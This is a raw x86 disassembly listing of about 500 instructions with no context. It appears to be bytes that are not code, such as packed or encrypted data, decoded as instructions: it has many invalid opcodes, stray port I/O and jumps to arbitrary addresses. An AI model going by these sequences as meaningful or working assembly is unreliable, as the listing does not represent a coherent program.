  41997c:	fldenv [ebp+0x6f]
  41997f:	sti    
  419980:	call   0xa31562eb
  419985:	mov    BYTE PTR [ecx+0x64],bh
  419988:	cmp    al,0x3b
  41998a:	dec    esp
  41998b:	push   edi
  41998c:	aas    
  41998d:	(bad)  
  41998f:	add    ebp,DWORD PTR [ebx+0x263ed38d]
  419995:	add    DWORD PTR [esi+0x7],0x27
  419999:	fwait
  41999a:	outs   dx,BYTE PTR ds:[esi]
  41999b:	adc    cl,BYTE PTR [esp+ebx*4]
  41999e:	pushf  
  41999f:	fmul   QWORD PTR ds:0x3709f8cb
  4199a5:	push   ebx
  4199a6:	mov    ds:0x888613ad,eax
  4199ab:	repnz or bl,BYTE PTR [edi]
  4199ae:	mov    ds:0x39664a09,al
  4199b3:	push   edi
  4199b4:	sbb    dl,BYTE PTR [ecx-0x6f]
  4199b7:	jg     0x4199b8
  4199b9:	cld    
  4199ba:	inc    esi
  4199bb:	clc    
  4199bc:	int3   
  4199bd:	xrelease mov DWORD PTR [edx+eax*2+0x2b],ecx
  4199c2:	inc    eax
  4199c3:	jo     0x41996b
  4199c5:	mov    ch,0x99
  4199c7:	pop    edx
  4199c8:	pushf  
  4199c9:	or     BYTE PTR [eax+0x52],ch
  4199cc:	xor    eax,0x86313d0e
  4199d1:	in     eax,0xdb
  4199d3:	pop    ecx
  4199d4:	mov    dh,0x54
  4199d6:	adc    ebx,DWORD PTR [ecx+0x544e6d6b]
  4199dc:	pop    ds
  4199dd:	push   ebp
  4199de:	call   0xf4b5:0x6ab1887b
  4199e5:	inc    edi
  4199e6:	adc    eax,0x5fa17724
  4199eb:	inc    esp
  4199ed:	fucom  st(5)
  4199ef:	lds    eax,FWORD PTR ds:0xb224e17b
  4199f5:	or     esi,DWORD PTR [edx-0x41]
  4199f8:	add    dl,ch
  4199fa:	mov    bl,BYTE PTR ds:[ecx+edi*2-0x46fb2f12]
  419a02:	sar    BYTE PTR [esi],0x93
  419a05:	int3   
  419a06:	shl    ch,1
  419a08:	mov    al,ds:0xfead9616
  419a0d:	jmp    0x4199da
  419a0f:	popa   
  419a10:	and    dl,BYTE PTR ss:[ecx-0x3eded09e]
  419a17:	sar    DWORD PTR [esi],cl
  419a19:	add    ch,BYTE PTR [ecx+0x53]
  419a1c:	int    0xf6
  419a1e:	dec    esi
  419a1f:	popa   
  419a20:	inc    ebx
  419a21:	xor    DWORD PTR [ebp+0x7c56c6e6],ecx
  419a27:	in     eax,dx
  419a28:	pop    ss
  419a29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a2a:	dec    ecx
  419a2b:	and    bl,BYTE PTR [ecx+0x67]
  419a2e:	aad    0x71
  419a30:	jle    0x4199bb
  419a32:	push   esp
  419a33:	pop    ebp
  419a34:	xor    cl,BYTE PTR [ebx]
  419a36:	int    0x68
  419a38:	cmp    edi,DWORD PTR [eax+0x46bcf410]
  419a3e:	addr16 xchg ecx,eax
  419a40:	add    al,0x16
  419a42:	sub    edx,DWORD PTR [eax+0x24]
  419a45:	xchg   edi,eax
  419a46:	mov    bh,0xc7
  419a48:	adc    ch,BYTE PTR fs:[ebx]
  419a4b:	and    dh,BYTE PTR [edx+edx*4-0x59]
  419a4f:	cmp    ebp,edx
  419a51:	dec    esi
  419a52:	cmp    DWORD PTR [ebx-0x4acab58f],ebx
  419a58:	inc    esp
  419a59:	sbb    DWORD PTR [ebx+0x2909792d],edi
  419a5f:	mov    DWORD PTR cs:[ebx],esi
  419a62:	xchg   dh,ch
  419a64:	xor    bh,dh
  419a66:	fwait
  419a67:	add    dl,al
  419a69:	mov    eax,ds:0xcdd3b223
  419a6e:	(bad)
  419a71:	out    0xe,al
  419a73:	dec    eax
  419a74:	cwde   
  419a75:	mov    eax,ds:0x22dabbc9
  419a7a:	cdq    
  419a7b:	lds    esi,FWORD PTR [edx-0x13eae7d8]
  419a81:	in     al,dx
  419a82:	jg     0x419acf
  419a84:	or     DWORD PTR [eax+0x2d],eax
  419a87:	call   0x7627:0xf136a2cc
  419a8e:	out    0xe6,eax
  419a90:	enter  0x1e03,0xa0
  419a94:	aas    
  419a95:	daa    
  419a96:	pop    es
  419a97:	mov    bl,BYTE PTR [edx+0x4a]
  419a9a:	push   0x3117f910
  419a9f:	adc    BYTE PTR [edi-0x2f],al
  419aa2:	and    al,BYTE PTR [ecx+0x7953dd1b]
  419aa8:	loope  0x419abc
  419aaa:	call   0xf615:0x9014faee
  419ab1:	das    
  419ab2:	retf   0x610c
  419ab5:	mov    ecx,0x90298399
  419aba:	mov    edi,0xa1f54aa6
  419abf:	or     esp,DWORD PTR [edi-0x2a95c8d3]
  419ac5:	mov    ds:0x9b3719fb,al
  419aca:	ret    
  419acb:	xor    esi,DWORD PTR es:[eax+0x324bbbc]
  419ad2:	fcmove st,st(3)
  419ad4:	pop    esp
  419ad5:	(bad)  
  419ad6:	dec    edi
  419ad7:	loop   0x419ad7
  419ad9:	add    edi,DWORD PTR [ebx-0x125dad45]
  419adf:	lods   al,BYTE PTR ds:[esi]
  419ae0:	popa   
  419ae1:	inc    edi
  419ae2:	icebp  
  419ae3:	fsub   QWORD PTR [eax-0x3399fe22]
  419ae9:	jge    0x419abe
  419aeb:	fiadd  DWORD PTR [ebx]
  419aed:	repz inc esi
  419aef:	and    ebx,eax
  419af1:	ret    0x6ab9
  419af4:	adc    edx,eax
  419af6:	inc    edx
  419af7:	xchg   esi,ebp
  419af9:	add    BYTE PTR [esp+edx*4-0x6a],bl
  419afd:	outs   dx,DWORD PTR ds:[esi]
  419afe:	loop   0x419b5a
  419b00:	out    dx,eax
  419b01:	sub    ebx,ebx
  419b03:	leave  
  419b04:	aaa    
  419b05:	rcr    BYTE PTR [eax-0x46],cl
  419b08:	mov    eax,ds:0x17849bd6
  419b0d:	xor    dh,BYTE PTR [esi-0xd]
  419b10:	gs pop ax
  419b13:	mov    ecx,0x333a7050
  419b18:	jne    0x419b75
  419b1a:	xor    al,bh
  419b1c:	lds    edx,FWORD PTR [ebx-0x5a]
  419b1f:	dec    esi
  419b20:	xchg   esp,eax
  419b21:	leave  
  419b22:	stos   BYTE PTR es:[edi],al
  419b23:	and    DWORD PTR ds:0x10ed91b0,0x7f
  419b2a:	jns    0x419b40
  419b2c:	mov    ds:0xdff359fd,eax
  419b31:	daa    
  419b32:	ds push ebp
  419b34:	jle    0x419b71
  419b36:	repnz pop ss
  419b38:	dec    ebp
  419b39:	pushf  
  419b3a:	xchg   DWORD PTR [eax+0x4c],edx
  419b3d:	scas   al,BYTE PTR es:[edi]
  419b3e:	and    BYTE PTR [ebx+0x5bfbafa6],ah
  419b44:	retf   0xd54b
  419b47:	sahf   
  419b48:	cmp    esp,DWORD PTR [ebx-0x35d61fee]
  419b4e:	mov    ds:0x981f1226,al
  419b53:	mov    edi,0x9ac09f61
  419b58:	pop    esp
  419b59:	xor    BYTE PTR [edx+0x6f],al
  419b5c:	enter  0xcdb4,0x5d
  419b60:	cmp    dl,BYTE PTR ds:0xae6a9a38
  419b66:	mov    ch,BYTE PTR [edx+0x38]
  419b69:	push   edx
  419b6a:	add    al,0x7
  419b6c:	and    eax,0x2b6d679a
  419b71:	add    BYTE PTR [edi-0x66bf4c29],al
  419b77:	call   0x3af7ddde
  419b7c:	aaa    
  419b7d:	inc    edi
  419b7e:	in     al,0x64
  419b80:	jae    0x419bdc
  419b82:	adc    dh,dl
  419b84:	fdivr  QWORD PTR [edx]
  419b86:	repz enter 0x8b3b,0xb5
  419b8b:	sbb    eax,0xf159ac34
  419b90:	cmp    al,BYTE PTR [esi]
  419b92:	sub    ch,BYTE PTR [eax-0x248cda6]
  419b98:	jge    0x419c02
  419b9a:	in     al,0x49
  419b9c:	ror    BYTE PTR [edx],0xa2
  419b9f:	je     0x419c05
  419ba1:	gs ss icebp 
  419ba4:	xchg   ecx,eax
  419ba5:	add    bh,BYTE PTR [eax-0x5f]
  419ba8:	mov    edx,0x60a1dad8
  419bad:	fdiv   DWORD PTR [edi-0x5202f47a]
  419bb3:	adc    ah,BYTE PTR [ebx+0x5f]
  419bb6:	fldenv [edi]
  419bb8:	pop    eax
  419bb9:	xor    esi,eax
  419bbb:	adc    edx,DWORD PTR [edx-0x2db37922]
  419bc1:	in     al,dx
  419bc2:	xor    DWORD PTR cs:[eax],0x4
  419bc6:	shl    DWORD PTR [esi-0x5],0x1c
  419bca:	(bad)  
  419bcb:	ffreep st(0)
  419bcd:	mov    ds:0x6a2a6b9b,al
  419bd2:	or     BYTE PTR [ecx],cl
  419bd4:	(bad)  
  419bd6:	cmp    BYTE PTR [ebx+0x38d3bbf9],0x49
  419bdd:	loope  0x419c32
  419bdf:	in     eax,dx
  419be0:	repz daa 
  419be2:	push   esp
  419be3:	xor    edx,edi
  419be5:	jg     0x419c5e
  419be7:	aas    
  419be8:	inc    ebx
  419be9:	or     edx,DWORD PTR [ebx]
  419beb:	inc    ecx
  419bec:	popw   ss
  419bee:	clc    
  419bef:	jge    0x419c3e
  419bf1:	call   0x1e45fd02
  419bf6:	or     cl,BYTE PTR [esi-0x22]
  419bf9:	add    BYTE PTR [ecx-0x3b],bh
  419bfc:	out    0x47,eax
  419bfe:	add    dl,BYTE PTR [esi]
  419c00:	outs   dx,DWORD PTR ds:[esi]
  419c01:	dec    esp
  419c02:	push   ss
  419c03:	xchg   edx,eax
  419c04:	mov    bh,0x56
  419c06:	repnz dec ecx
  419c08:	fst    QWORD PTR [ebx+0x70c2b472]
  419c0e:	jmp    0x419c0a
  419c10:	sub    al,0x57
  419c12:	push   ebp
  419c13:	stc    
  419c14:	lds    ebx,FWORD PTR [eax-0x12c3a3d3]
  419c1a:	mov    ebp,0xdd197c9f
  419c1f:	out    dx,al
  419c20:	push   ds
  419c21:	cli    
  419c22:	jp     0x419c97
  419c24:	and    DWORD PTR [ecx+0x7],esp
  419c27:	js     0x419c3d
  419c29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c2a:	lods   al,BYTE PTR ds:[esi]
  419c2b:	je     0x419c40
  419c2d:	sbb    bh,0x29
  419c30:	sbb    BYTE PTR [edx+edx*2],ah
  419c33:	jnp    0x419c7e
  419c35:	mov    esp,0xf01c9c4
  419c3a:	(bad)  
  419c3b:	int3   
  419c3c:	xor    BYTE PTR [edi+0x743a6775],ah
  419c42:	sub    eax,0x18f9306b
  419c47:	fstp   DWORD PTR [esi+eiz*4]
  419c4a:	fadd   QWORD PTR [ecx-0x17]
  419c4d:	call   0x925a1ff4
  419c52:	(bad)  
  419c54:	mov    ds:0xd83d43a4,al
  419c59:	shl    BYTE PTR [ebp-0x59fb32ef],1
  419c5f:	sub    ah,dh
  419c61:	inc    ebp
  419c62:	mov    ds,WORD PTR [ebx+ebx*4]
  419c65:	xor    al,0x7e
  419c67:	sub    eax,0x37f6bb46
  419c6c:	xor    DWORD PTR [ecx+0x3926cff7],ebp
  419c72:	(bad)  
  419c74:	call   FWORD PTR [ebp+0x4aeb09b]
  419c7a:	icebp  
  419c7b:	and    eax,0xfd685513
  419c80:	daa    
  419c81:	pop    esi
  419c82:	(bad)  
  419c83:	sbb    al,0xcd
  419c85:	mov    bh,ch
  419c87:	loop   0x419c57
  419c89:	and    al,0xb1
  419c8b:	and    DWORD PTR [edx+0x586f0ad1],esi
  419c91:	sar    ecx,cl
  419c93:	shl    BYTE PTR [ecx+0x57],cl
  419c96:	jo     0x419c7f
  419c98:	fcomp  QWORD PTR [ecx+0x3ff55230]
  419c9e:	xor    al,0xb5
  419ca0:	push   edx
  419ca1:	adc    BYTE PTR [eax-0x67],dh
  419ca4:	stc    
  419ca5:	mov    ebx,0x79c5a41e
  419caa:	pop    esi
  419cab:	add    al,0xfb
  419cad:	jo     0x419c44
  419caf:	test   ebx,ebx
  419cb1:	gs scas eax,DWORD PTR es:[edi]
  419cb3:	test   DWORD PTR [ecx+edi*4],ecx
  419cb6:	stos   BYTE PTR es:[edi],al
  419cb7:	(bad)  
  419cb8:	and    eax,0xacbf25c6
  419cbd:	cmp    al,0x35
  419cbf:	fs rol edx,0x7
  419cc3:	mov    ebx,DWORD PTR [edx]
  419cc5:	mov    fs,ecx
  419cc7:	cli    
  419cc8:	cmp    al,0x4f
  419cca:	xor    edx,DWORD PTR [ecx-0x1eaacfe7]
  419cd0:	lods   eax,DWORD PTR ds:[esi]
  419cd1:	cmp    ebx,edi
  419cd3:	jb     0x419d2c
  419cd5:	add    ecx,ebp
  419cd7:	mov    ds:0xbdd92d9,al
  419cdc:	and    bh,BYTE PTR [edx]
  419cde:	add    cl,BYTE PTR [ecx+0x1dcd3acc]
  419ce4:	jl     0x419ca5
  419ce6:	sahf   
  419ce7:	jp     0x419c90
  419ce9:	pushf  
  419cea:	adc    DWORD PTR [eax+0x3d9456d0],ebx
  419cf0:	stos   DWORD PTR es:[edi],eax
  419cf1:	rcr    esi,cl
  419cf3:	dec    ebp
  419cf4:	cdq    
  419cf5:	dec    esi
  419cf6:	mov    ebx,0x708d08cd
  419cfb:	dec    esi
  419cfc:	sbb    eax,0x87b2fa2a
  419d01:	jmp    0xe00a0eae
  419d06:	cdq    
  419d07:	dec    ebx
  419d08:	gs and al,0x26
  419d0b:	mov    BYTE PTR [edi],0xba
  419d0e:	xchg   edx,eax
  419d0f:	inc    esi
  419d10:	mov    edi,0x5e3834a2
  419d15:	popf   
  419d16:	inc    ebp
  419d17:	xchg   ebx,eax
  419d18:	mov    esp,0xc399efc8
  419d1d:	das    
  419d1e:	out    dx,al
  419d1f:	push   0x2e149636
  419d24:	(bad)  
  419d26:	(bad)  [edi+0x38c6eba6]
  419d2c:	mov    al,ds:0xe1d6eb00
  419d31:	icebp  
  419d32:	mov    ebp,0x12b033b7
  419d37:	jp     0x419d8a
  419d39:	jge    0x419cd8
  419d3b:	mov    bh,0xe3
  419d3d:	in     eax,dx
  419d3e:	push   ecx
  419d3f:	clc    
  419d40:	icebp  
  419d41:	ret    
  419d42:	(bad)  
  419d43:	in     al,dx
  419d44:	jb     0x419cd7
  419d46:	xchg   DWORD PTR [ecx],esp
  419d48:	rcl    edi,1
  419d4a:	js     0x419d32
  419d4c:	ins    BYTE PTR es:[edi],dx
  419d4d:	mov    eax,ebx
  419d4f:	ja     0x419ce7
  419d51:	inc    edx
  419d52:	mov    bh,0xe
  419d54:	jmp    0x7769f002
  419d59:	fimul  DWORD PTR [edi]
  419d5b:	inc    edx
  419d5c:	inc    eax
  419d5d:	push   ebp
  419d5e:	mov    dl,0x77
  419d60:	repnz xchg ecx,eax
  419d62:	call   0x570d:0xc0201016
  419d69:	mov    eax,ebx
  419d6b:	fldcw  WORD PTR [esi]
  419d6d:	xor    ah,ch
  419d6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d70:	mov    dl,0x1
  419d72:	fmul   st,st(4)
  419d74:	icebp  
  419d75:	dec    ecx
  419d76:	pop    edi
  419d77:	stos   BYTE PTR es:[edi],al
  419d78:	pop    eax
  419d79:	mov    bl,0x6e
  419d7b:	lods   al,BYTE PTR ds:[esi]
  419d7c:	xchg   edi,eax
  419d7d:	mov    ecx,0xd95e514f
  419d82:	ret    0x4e38
  419d85:	call   0x22af1755
  419d8a:	push   esi
  419d8b:	fwait
  419d8c:	add    eax,0xb21ad298
  419d91:	mov    ebx,0x738eb8a7
  419d96:	pop    es
  419d97:	scas   eax,DWORD PTR es:[edi]
  419d98:	cld    
  419d99:	add    dl,BYTE PTR [ebp-0xa29d2a2]
  419d9f:	push   es
  419da0:	sub    esp,DWORD PTR [edx-0x1a]
  419da3:	pop    ebp
  419da4:	jmp    0x419e1a
  419da6:	bound  edi,QWORD PTR [ecx-0x6597ed9f]
  419dac:	mov    bl,0x81
  419dae:	ret    
  419daf:	fbstp  TBYTE PTR [ecx]
  419db1:	cmp    ebp,0xffffff86
  419db4:	dec    ecx
  419db5:	imul   esi,DWORD PTR [eax],0x37
  419db8:	xor    bl,BYTE PTR [ecx+0x77]
  419dbb:	es icebp 
  419dbd:	test   edx,esp
  419dbf:	xchg   esi,eax
  419dc0:	pop    ecx
  419dc1:	mov    ds:0x2102a3a7,al
  419dc6:	test   BYTE PTR [edi],ch
  419dc8:	push   0xdec9df46
  419dcd:	push   es
  419dce:	adc    eax,0xe820dd07
  419dd3:	sbb    al,0x50
  419dd5:	cmp    eax,0x93f0ac9a
  419dda:	lods   al,BYTE PTR ds:[esi]
  419ddb:	ins    BYTE PTR es:[edi],dx
  419ddc:	sbb    BYTE PTR [ebx],dl
  419dde:	icebp  
  419ddf:	xchg   esp,eax
  419de0:	add    DWORD PTR [edx],0xffffff89
  419de3:	ret    0xe379
  419de6:	dec    eax
  419de7:	jmp    0x419e03
  419de9:	or     BYTE PTR [esp+ebx*8],0xce
  419ded:	mov    esp,0x269270e2
  419df2:	popf   
  419df3:	fld    TBYTE PTR [ebp+edx*2+0x4f]
  419df7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419df8:	jne    0x419e6f
  419dfa:	dec    eax
  419dfb:	(bad)  
  419dfc:	and    al,0x1c
  419dfe:	popa   
  419dff:	xchg   DWORD PTR [ecx-0x47],ebp
  419e02:	adc    DWORD PTR [ebx],edi
  419e04:	test   BYTE PTR [esi+ebx*1-0x727992f2],0xd3
  419e0c:	and    ebx,edx
  419e0e:	jmp    0x5058:0x88d808be
  419e15:	(bad)  
  419e16:	xor    edx,ecx
  419e18:	test   DWORD PTR [edx],esp
  419e1a:	fucomp st(2)
  419e1c:	adc    eax,0x98972d3
  419e21:	in     al,0x8d
  419e23:	add    al,0x5a
  419e25:	pop    edx
  419e26:	imul   edi,ebp,0xf508d8b
  419e2c:	repnz mov edi,0x326db7a
  419e32:	jge    0x419e1b
  419e34:	loope  0x419ea2
  419e36:	cmp    BYTE PTR [edx],bl
  419e38:	xchg   ecx,eax
  419e39:	and    BYTE PTR [ecx],bh
  419e3b:	adc    ah,BYTE PTR ds:0x87d5fba
  419e41:	dec    edx
  419e42:	dec    ecx
  419e43:	jl     0x419de6
  419e45:	retf   
  419e46:	sbb    eax,0xf81b1173
  419e4b:	inc    ebp
  419e4c:	mov    eax,DWORD PTR [ebx+0x11]
  419e4f:	sbb    ebx,eax
  419e51:	xor    al,0xfc
  419e53:	lods   eax,DWORD PTR ds:[si]
  419e56:	mov    ah,0xdd
  419e58:	pop    esp
  419e59:	add    DWORD PTR [esi+0x42],0x1
  419e5d:	or     eax,0xa70c9f21
  419e62:	pusha  
  419e63:	daa    
  419e64:	sub    BYTE PTR [edx+edx*2],ah
  419e67:	loopne 0x419e58
  419e69:	jnp    0x419e61
  419e6b:	and    ah,BYTE PTR [ecx]
  419e6d:	and    BYTE PTR [ebx-0x17],dh
  419e70:	push   edx
  419e71:	xchg   esp,eax
  419e72:	mov    bh,0x79
  419e74:	sbb    esi,DWORD PTR [ecx+0x26]
  419e77:	mov    ds:0x49f9507e,al
  419e7c:	add    DWORD PTR [eax+edx*4+0x479e7833],ebp
  419e83:	das    
  419e84:	rcl    BYTE PTR [edi],0x14
  419e87:	xor    DWORD PTR [eax+0x43],0x60af3f0b
  419e8e:	leave  
  419e8f:	sub    DWORD PTR [ecx-0x41],eax
  419e92:	cmp    eax,0x263c3799
  419e97:	cli    
  419e98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e99:	dec    ebx
  419e9a:	ret    0xeba8
  419e9d:	je     0x419e58
  419e9f:	mov    dl,0x8f
  419ea1:	or     DWORD PTR [ecx],edx
  419ea3:	dec    eax
  419ea4:	pushf  
  419ea5:	adc    al,0x5
  419ea7:	fwait
  419ea8:	enter  0xf36f,0x3b
  419eac:	and    BYTE PTR [edi-0x11],bl
  419eaf:	adc    eax,0xe7de5d29
  419eb4:	push   es
  419eb5:	mov    cl,0xf2
  419eb7:	js     0x419e7f
  419eb9:	xchg   edx,eax
  419eba:	lahf   
  419ebb:	out    dx,al
  419ebc:	stc    
  419ebd:	js     0x419e98
  419ebf:	les    esp,FWORD PTR ds:0xa799fe38
  419ec5:	mov    esi,0x28fd5c49
  419eca:	loop   0x419ef4
  419ecc:	inc    eax
  419ecd:	rcl    DWORD PTR [esi-0x7a1634c5],0x44
  419ed4:	sub    DWORD PTR [edx+0x50409030],edi
  419eda:	sti    
  419edb:	mov    ds:0x4ddb8337,eax
  419ee0:	cmp    eax,0x177789fe
  419ee5:	add    BYTE PTR [eax+0x14],dh
  419ee8:	fsubr  DWORD PTR [edx-0x22]
  419eeb:	ret    0x1241
  419eee:	mov    eax,ds:0x4e779d1f
  419ef3:	or     dh,dh
  419ef5:	les    esi,FWORD PTR [esi-0x55]
  419ef8:	ds gs xchg ecx,eax
  419efb:	mov    ecx,0xfb85e5b
  419f00:	outs   dx,BYTE PTR ds:[esi]
  419f01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f02:	sub    DWORD PTR cs:[ebx],edi
  419f05:	xchg   ecx,eax
  419f06:	add    DWORD PTR [eax+0x2e],0xd11d1f26
  419f0d:	jg     0x419f58
  419f0f:	xor    al,0x2d
  419f11:	xor    eax,0x413a7b1f
  419f16:	sbb    ecx,edi
  419f18:	lds    edi,FWORD PTR [ecx+0x53]
  419f1b:	push   0xffffffd1
  419f1d:	lock push esi
  419f1f:	jge    0x419f4c
  419f21:	es xchg esi,eax
  419f23:	into   
  419f24:	cmp    edx,DWORD PTR [ecx-0x1e766758]
  419f2a:	test   BYTE PTR [ebp+0x4d8b721a],bh
  419f30:	in     al,0xf2
  419f32:	pop    ss
  419f33:	div    DWORD PTR [ecx+eiz*1+0x53]
  419f37:	or     al,dl
  419f39:	jmp    0x96191c5c
  419f3e:	popf   
  419f3f:	ins    DWORD PTR es:[edi],dx
  419f40:	int    0x49
  419f42:	aaa    
  419f43:	scas   al,BYTE PTR es:[edi]
  419f44:	leave  
  419f45:	add    al,0x3c
  419f47:	out    dx,al
  419f48:	clc    
  419f49:	int3   
  419f4a:	imul   esi,DWORD PTR [edx+0x6f],0x12b48183
  419f51:	mov    ds:0xdaf0376e,eax
  419f56:	push   0xdf144025
  419f5b:	mov    bl,0x2c
  419f5d:	repnz sub edi,DWORD PTR es:[esp+ebx*8]
  419f62:	bound  edi,QWORD PTR [edi-0x12]
  419f65:	sub    BYTE PTR [ebx+0x7b],0x44
  419f69:	add    BYTE PTR [eax],cl
  419f6b:	xchg   edx,eax
  419f6c:	es (bad) 
  419f6e:	xor    cl,BYTE PTR [ebp-0x31e4fbf5]
  419f74:	popa   
  419f75:	sub    BYTE PTR cs:[ebx+0x17],cl
  419f79:	xor    al,0x22
  419f7b:	dec    ebp
  419f7c:	mov    esp,0x36e091ee
  419f81:	mov    bh,0x19
  419f83:	(bad)  
  419f84:	lock mov ah,0xa
  419f87:	mov    esi,0xf80fde11
  419f8c:	es cld 
  419f8e:	inc    edx
  419f8f:	cs pop ss
  419f91:	xor    al,0x53
  419f93:	adc    eax,0x9825ef5d
  419f98:	pushf  
  419f99:	paddsw mm3,QWORD PTR [edi-0x435e8ad2]
  419fa0:	fisttp WORD PTR [edi]
  419fa2:	mov    edi,0xa4e0a309
  419fa7:	xor    eax,0x5904c062
  419fac:	and    eax,0x5df7c205
  419fb1:	gs add ebx,edx
  419fb4:	adc    ch,BYTE PTR [ecx+0x1]
  419fb7:	shl    DWORD PTR [ecx-0x72],0x44
  419fbb:	pusha  
  419fbc:	xchg   edi,eax
  419fbd:	push   esi
  419fbe:	xor    al,0x2e
  419fc0:	mov    ds:0x4c35d28b,eax
  419fc5:	call   0x758a:0x3c361a07
  419fcc:	pop    ds
  419fcd:	out    0x8,al
  419fcf:	cld    
  419fd0:	or     eax,ebp
  419fd2:	or     BYTE PTR [ecx+edi*8+0x5390d5ac],ah
  419fd9:	jle    0x419fde
  419fdb:	cs in  eax,dx
  419fdd:	push   esp
  419fde:	(bad)  
  419fdf:	(bad)  
  419fe0:	xor    al,0xf5
  419fe2:	test   DWORD PTR [ebp-0x5f],0x74e4fe19
  419fe9:	jmp    0xf37cf6b4
  419fee:	push   ebp
  419fef:	retf   
  419ff0:	repz inc ebp
  419ff2:	inc    ebp
  419ff3:	dec    esi
  419ff4:	push   ss
  419ff5:	xor    DWORD PTR [ecx+ecx*2],esi
  419ff8:	inc    esi
  419ff9:	mov    ebp,0xf7b5d847
  419ffe:	push   edx
  419fff:	push   ebx
  41a000:	jne    0x41a057
  41a002:	pop    eax
  41a003:	jmp    0x8fa8d316
  41a008:	add    DWORD PTR [edx+ebx*2+0x6acb4951],0x4248c341
  41a013:	in     al,dx
  41a014:	push   esi
  41a015:	inc    ebp
  41a017:	and    eax,0x64c8310d
  41a01c:	xchg   ah,bl
  41a01e:	jg     0x41a013
  41a020:	xor    al,0x55
  41a022:	loop   0x41a01b
  41a024:	inc    edx
  41a025:	jae    0x419fca
  41a027:	add    al,0x19
  41a029:	lods   eax,DWORD PTR ds:[esi]
  41a02a:	mov    edx,0x864997d5
  41a02f:	push   es
  41a030:	ds (bad) 
  41a032:	sub    esp,DWORD PTR [eax+0x1f]
  41a035:	cld    
  41a036:	sbb    eax,DWORD PTR [edx]
  41a038:	adc    esp,eax
  41a03a:	add    al,0xc9
  41a03c:	jmp    0x419fe3
  41a03e:	mov    al,0x50
  41a040:	fisub  WORD PTR [edi-0x2a]
  41a043:	and    ah,bl
  41a045:	push   edx
  41a046:	sbb    dh,dl
  41a048:	xchg   ebx,eax
  41a049:	pop    esi
  41a04a:	(bad)  
  41a04b:	fldcw  WORD PTR [esi-0x669c9600]
  41a051:	icebp  
  41a052:	rcl    BYTE PTR [esi],1
  41a054:	mov    ah,0xa6
  41a056:	fsub   st,st(0)
  41a058:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a059:	push   ss
  41a05a:	ret    0x16aa
  41a05d:	out    0x31,al
  41a05f:	mov    ebp,0x17f22f1b
  41a064:	push   ebp
  41a065:	inc    ebx
  41a066:	mov    dl,0xa7
  41a068:	(bad)  
  41a069:	int    0x70
  41a06b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a06c:	icebp  
  41a06d:	push   eax
  41a06e:	xchg   edi,eax
  41a06f:	jge    0x41a0a3
  41a071:	sub    ebp,ebx
  41a073:	push   esi
  41a074:	push   ebx
  41a075:	jl     0x41a078
  41a077:	(bad)  
  41a078:	cdq    
  41a079:	jb     0x41a017
  41a07b:	xlat   BYTE PTR ds:[ebx]
  41a07c:	mov    al,0xd4
  41a07e:	inc    esp
  41a07f:	inc    edx
  41a080:	push   0xb5706c59
  41a085:	push   esi
  41a086:	pop    es
  41a087:	cmp    al,0xf8
  41a089:	or     al,0x63
  41a08b:	test   eax,0xed8c0ba4
  41a090:	pushf  
  41a091:	hlt    
  41a092:	jle    0x41a0fb
  41a094:	mov    dh,0x4b
  41a096:	xchg   esi,eax
  41a097:	imul   ebp,DWORD PTR ds:0x5a11d761,0xffffff89
  41a09e:	cmp    ah,BYTE PTR [ecx-0x38e7b6a9]
  41a0a4:	or     DWORD PTR [eax-0x52e5a837],0xffffff83
  41a0ab:	ror    DWORD PTR [ebx],cl
  41a0ad:	enter  0x1b4d,0xcb
  41a0b1:	test   eax,0xd7f17053
  41a0b6:	(bad)  
  41a0b7:	mov    ebx,0x5fc5c1a8
  41a0bc:	lahf   
  41a0bd:	inc    edx
  41a0be:	xchg   ecx,eax
  41a0bf:	pop    ds
  41a0c0:	mov    dl,0xc4
  41a0c2:	add    al,0x41
  41a0c4:	or     eax,0xe8d9bd70
  41a0c9:	xchg   esi,eax
  41a0ca:	mov    eax,0xb861d6b
  41a0cf:	in     al,0x18
  41a0d1:	mov    ch,0x25
  41a0d3:	iret   
  41a0d4:	inc    ebp
  41a0d5:	popf   
  41a0d6:	test   BYTE PTR [ebx],bh
  41a0d8:	mov    ah,dl
  41a0da:	adc    al,BYTE PTR [edi+ebx*8]
  41a0dd:	or     DWORD PTR [esi-0x5b],edx
  41a0e0:	fsubr  QWORD PTR ds:0x2ca72a68
  41a0e6:	scas   eax,DWORD PTR es:[edi]
  41a0e7:	aam    0xb5
  41a0e9:	jns    0x41a11c
  41a0eb:	(bad)  
  41a0ec:	into   
  41a0ed:	mov    eax,ds:0x351343b
  41a0f2:	inc    ecx
  41a0f3:	dec    eax
  41a0f4:	aaa    
  41a0f5:	jmp    0x708d5b15
  41a0fa:	loop   0x41a138
  41a0fc:	mov    edi,0x661f3e0f
  41a101:	mov    edx,0xd5bd4f03
  41a106:	mov    ecx,0xc19f3a7f
  41a10b:	test   eax,0x751ddf30
  41a110:	and    ebp,esp
  41a112:	cld    
  41a113:	mov    bh,0x51
  41a115:	fwait
  41a116:	sub    ah,BYTE PTR [ecx]
  41a118:	mov    cl,0xa
  41a11a:	out    0xfa,eax
  41a11c:	rcr    ah,1
  41a11e:	add    eax,0x2173e5f6
  41a123:	lea    eax,[eax]
  41a125:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a126:	inc    edi
  41a127:	ins    DWORD PTR es:[edi],dx
  41a128:	mov    esp,0xc5800dcd
  41a12d:	repnz jecxz 0x41a133
  41a130:	rcl    BYTE PTR [eax],0x55
  41a133:	mov    gs,WORD PTR [ebx+0x26]
  41a136:	mul    DWORD PTR [edi-0x4e101283]
  41a13c:	and    al,0xbd
  41a13e:	int3   
  41a13f:	or     ch,dl
  41a141:	jne    0x41a13e
  41a143:	xor    DWORD PTR [eax+ebp*2+0x7f],ecx
  41a147:	jl     0x41a13d
  41a149:	int    0x5d
  41a14b:	mov    BYTE PTR [ebx],dl
  41a14d:	adc    bl,BYTE PTR [edx+0x6f]
  41a150:	sbb    DWORD PTR [edx-0x64],0xffffffca
  41a154:	sub    al,0x33
  41a156:	jl     0x41a141
  41a158:	dec    ebx
  41a159:	into   
  41a15a:	inc    ebp
